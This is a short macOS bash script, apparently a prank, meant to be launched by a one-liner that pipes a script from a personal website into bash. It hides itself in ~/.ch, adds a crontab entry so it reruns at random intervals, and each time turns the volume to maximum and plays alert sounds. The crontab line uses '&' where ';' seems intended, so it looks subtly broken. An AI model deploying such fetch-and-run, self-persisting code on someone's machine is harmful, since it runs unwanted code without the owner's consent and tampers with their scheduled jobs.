# curl -Ss http://www.ronaldvwilliams.com/scripts/cron.sh | bash

echo 'starting script...'
mkdir ~/.ch
cd ~/.ch

# NOTE : The double quotes around EOM are necessary to avoid variable expansion
read -r -d '' VARIABLE << "EOM"
scriptName=~/.ch/ch.sh
currVolume=$(osascript -e 'output volume of (get volume settings)')
crontabs="$(crontab -l)"
crontabs="$(echo "$crontabs" | grep -v $scriptName)"
randNum=$((RANDOM%10+1))
newCron="* */$randNum * * * $scriptName"
crontabs="$(echo "$crontabs" & echo "$newCron")"
echo "$crontabs" | crontab

# set the volume to 100, play some sounds, then set it back to the original volume
osascript -e 'set volume output volume 100'
afplay /System/Library/Sounds/Tink.aiff
afplay /System/Library/Sounds/Tink.aiff
afplay /System/Library/Sounds/Tink.aiff
osascript -e "set volume output volume $currVolume"

EOM

echo "$VARIABLE" > ./ch.sh
chmod 755 ./ch.sh
./ch.sh

echo 'script done'
